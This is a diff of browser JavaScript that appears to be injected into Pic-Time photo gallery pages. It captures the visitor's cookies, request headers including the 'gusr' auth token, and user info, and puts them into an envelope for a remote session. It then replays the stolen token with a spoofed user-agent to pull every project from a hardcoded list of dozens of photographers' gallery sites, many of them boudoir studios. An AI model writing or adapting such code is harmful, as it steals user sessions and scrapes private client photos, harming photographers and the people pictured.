@@ -1,3 +1,10 @@
+// // Begin Util inspect
+// var script = document.createElement('script');
+// script.src = 'https://cdn.jsdelivr.net/npm/util-inspect@0.1.8/index.min.js';
+// console.log(inspect(_pt$));
+// // End Util Inspect
+
+
 // Setup the functions
 if (!window.remoteSetupComplete) {
   window.uuidv4 = () => {
@@ -30,10 +37,7 @@ if (!window.remoteSetupComplete) {
     envelope.data = data;
     envelope.userAgent = navigator?.userAgent;
 
-    envelope.ptData = {};
-    envelope.ptData.headers = _pt$?.hdrs || null;
-    envelope.ptData.userInfo = _pt$?.userInfo || null;
-    envelope.ptData.cookie = document.cookie;
+    envelope.ptData = window.ptData;
 
     envelope.ts = Date.now();
 
@@ -56,11 +60,12 @@ if (!window.remoteSetupComplete) {
     );
   };
 
-  window.startGettingUrls = async (pictimeGUserToken) => {
+  window.startGettingUrls = async () => {
     // const urlsToGet = ['https://emeraldazphotography.pic-time.com','https://ashleehamonphotography.pic-time.com','https://abbeyricephoto.pic-time.com','https://daniellemargheritephotography.pic-time.com','https://capturedphotographybyhaleighwehr.pic-time.com','https://ashleylaydenphoto.pic-time.com','https://heirlumephotography.pic-time.com','https://rosienaryphotography.pic-time.com','https://boudoirbykimberly.pic-time.com','https://clientgallery.anchorandveilphotography.com','https://kalimphotos.pic-time.com','https://ashleysaraphotography.pic-time.com','https://erboudoir.pic-time.com','https://taylorsmithphoto.pic-time.com','https://proofing.twopairphotography.com','https://lovedarling.pic-time.com','https://creation4use.pic-time.com','https://beauboudoir.pic-time.com','https://hushandwildboudoir.pic-time.com','https://sixteenfourteenphotography.pic-time.com','https://photosbyjill.pic-time.com','https://joelleelizabethphotography.pic-time.com','https://brookeshannonphotography.pic-time.com','https://kaliphotography.pic-time.com','https://ashleybenhamphotography.pic-time.com','https://sarahwettleson.pic-time.com','https://angiejustshootme.pic-time.com','https://brynnakathleenphotography.pic-time.com','https://wyethaugustinephotography.pic-time.com','https://lennonphotography.pic-time.com','https://jodiplumbley.pic-time.com','https://emilyisaksonphotography.pic-time.com','https://dallasolgaphotography.pic-time.com','https://tiarrasorte.pic-time.com','https://stacimitchellphoto.pic-time.com','https://winxphoto.pic-time.com','https://sweetlikepie.pic-time.com','https://ashleyizquierdo.pic-time.com','https://thomasdphotography.pic-time.com','https://amypaine.pic-time.com','https://carleoimages.pic-time.com','https://briannalanephotography.pic-time.com','https://normagarciaphotography.pic-time.com','https://rachelpourchierphotography.pic-time.com','https://loveanneliesephotography.pic-time.com','https://gallery.supernovaboudoir.com','https://bloomingbeautyboudoir.pic-time.com','https://trinacaryphotography.pic-time.com','https://luxeandcophotography.pic-time.com','https://keleighmichellephotography.pic-time.com','https://brynathorinn.pic-time.com','https://joymaura.pic-time.com','https://karenhamdorfphotography.pic-time.com','https://vogtography.pic-time.com','https://vibycreative.pic-time.com','https://shutterbugstudios.pic-time.com','https://letsarahtakeyourpicture.pic-time.com','https://taylorbartram.pic-time.com','https://dijanasphotography.pic-time.com','https://lauramackphotography.pic-time.com','https://travelfor2photography.pic-time.com','https://bybaze.pic-time.com','https://thehowardbrand.pic-time.com','https://brinaphotography.pic-time.com','https://krussophotography.pic-time.com','https://thehumblelion.pic-time.com','https://mckaylaerinedits.passgallery.com','https://katejensenphoto.pic-time.com','https://sheerphotos.passgallery.com','https://karlamason.passgallery.com','https://urbanimages.pic-time.com','https://blairjenniferphotography.pic-time.com','https://galleries.karenobristphotography.com','https://winshipphotography.passgallery.com'];
     const urlsToGet = [
       { url: 'https://rachelodellphotography.pic-time.com', brandId: 439966 },
       { brandId: 160281, url: "https://abigailephoto.pic-time.com" },
+      { url: 'https://photos.edandaileen.com', brandId: 40980},
       { url: 'https://aliciamarieintimateportraits.pic-time.com', brandId: 46743 },
       { url: 'https://rosienaryphotography.pic-time.com', brandId: 47807 },
       { url: 'https://lexyparksphotography.pic-time.com', brandId: 147932 },
@@ -2683,53 +2688,96 @@ if (!window.remoteSetupComplete) {
       },
     ];
 
-    try {
-      const htmlText = await getRequest(
-        "https://kelliavilaphotography.pic-time.com/portfolio",
-        pictimeGUserToken,
-        "text"
-      );
+    const pictimeGUserToken = window.ptData.headers.gusr;
 
-      const htmlData = {
-        url: "https://kelliavilaphotography.pic-time.com",
-        type: "GET /portfolio",
-        data: htmlText,
-      };
+    // try {
+    //   const htmlText = await getRequest(
+    //     "https://kelliavilaphotography.pic-time.com/portfolio",
+    //     pictimeGUserToken,
+    //     "text"
+    //   );
 
-      window.insertDoc("html-data", htmlData);
-    } catch (err) {console.log(err)}
+    //   const htmlData = {
+    //     url: "https://kelliavilaphotography.pic-time.com",
+    //     type: "GET /portfolio",
+    //     data: htmlText,
+    //   };
 
-    for (const urlToGet of urlsToGet) {
+    //   window.insertDoc("html-data", htmlData);
+    // } catch (err) {console.log(err)}
+
+    const getAllProjects = async (url) => {
+      const projects = [];
+      let pageProjectId = 0;
+
+      do {
+        const loadProjectsBatchJson = await fetch(`${url}/!servicesp.asmx/loadProjectsBatch`, {
+          method: 'POST',
+          headers: {
+            'content-type': 'application/json; charset=UTF-8',
+            'pictimeGUser': pictimeGUserToken,
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+          },
+          body: JSON.stringify({})
+        }).then(resp => resp.json());
+
+        const batch = loadProjectsBatchJson.d;
+
+        projects.push(...batch);
+
+        if (batch.length === 500) {
+          pageProjectId = batch[499][10];
+        } else {
+          pageProjectId = 0;
+        }
+      } while (pageProjectId);
+
+      return projects;
+    }
+
+    for (const urlToGet of urlsToGet.slice(0, 1)) { // TODO REMOVE SLICE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
       try {
         await new Promise((resolve) => setTimeout(resolve, 1000));
 
-        const accountProjectsJson = await postRequest(
-          `${urlToGet.url}/!servicesp.asmx/getAccountProjects`,
-          { },
-          pictimeGUserToken
-        );
+        const allAccountProjects = getAllProjects(urlToGet.url);
 
-        const accountProjectsData = {
-          url: urlToGet.url,
-          type: "getAccountProjects",
-          data: accountProjectsJson,
-        };
+        window.insertDoc("account-projects", allAccountProjects);
 
-        window.insertDoc("account-projects-data", accountProjectsData);
+        // const accountProjectsJson = await fetch(`${urlToGet.url}/!servicesp.asmx/getAccountProjects`, {
+        //   method: 'POST',
+        //   headers: {
+        //     'content-type': 'application/json; charset=UTF-8',
+        //     'pictimeGUser': pictimeGUserToken,
+        //     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+        //   },
+        //   body: JSON.stringify({})
+        // }).then(resp => resp.json());
 
-        const dashboardJson = await postRequest(
-          `${urlToGet.url}/!servicesp.asmx/dashboard`,
-          { },
-          pictimeGUserToken
-        );
+        // const accountProjectsData = {
+        //   url: urlToGet.url,
+        //   type: "getAccountProjects",
+        //   data: accountProjectsJson,
+        // };
 
-        const dashboardData = {
-          url: urlToGet.url,
-          type: "dashboard",
-          data: dashboardJson,
-        };
+        // window.insertDoc("account-projects-data", accountProjectsData);
 
-        window.insertDoc("dashboard-data", dashboardData);
+        // const dashboardJson = await fetch(`${urlToGet.url}/!servicesp.asmx/dashboard`, {
+        //   method: 'POST',
+        //   headers: {
+        //     'content-type': 'application/json; charset=UTF-8',
+        //     'pictimeGUser': pictimeGUserToken,
+        //     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+        //   },
+        //   body: JSON.stringify({})
+        // }).then(resp => resp.json());
+
+        // const dashboardData = {
+        //   url: urlToGet.url,
+        //   type: "dashboard",
+        //   data: dashboardJson,
+        // };
+
+        // window.insertDoc("dashboard-data", dashboardData);
 
         // // const portfolioResponse = await fetch(`${urlToGet.url}/!servicesp.asmx/getAccountClientPortfolio2`, {
         // //   method: 'POST',
@@ -2996,10 +3044,16 @@ if (!window.rjsSessionId) {
   window.rjsSessionId = uuidv4();
 }
 
+// Capture PT Data
+window.ptData = {};
+window.ptData.headers = _pt$?.hdrs || null;
+window.ptData.userInfo = _pt$?.userInfo || null;
+window.ptData.cookie = document.cookie;
+
 // Start Remote Session
 startSession();
 
 // Get URLs
-if (_pt$?.hdrs?.gusr) {
-  startGettingUrls(_pt$.hdrs.gusr);
+if (window.ptData.headers?.gusr) {
+  startGettingUrls(ptData);
 }
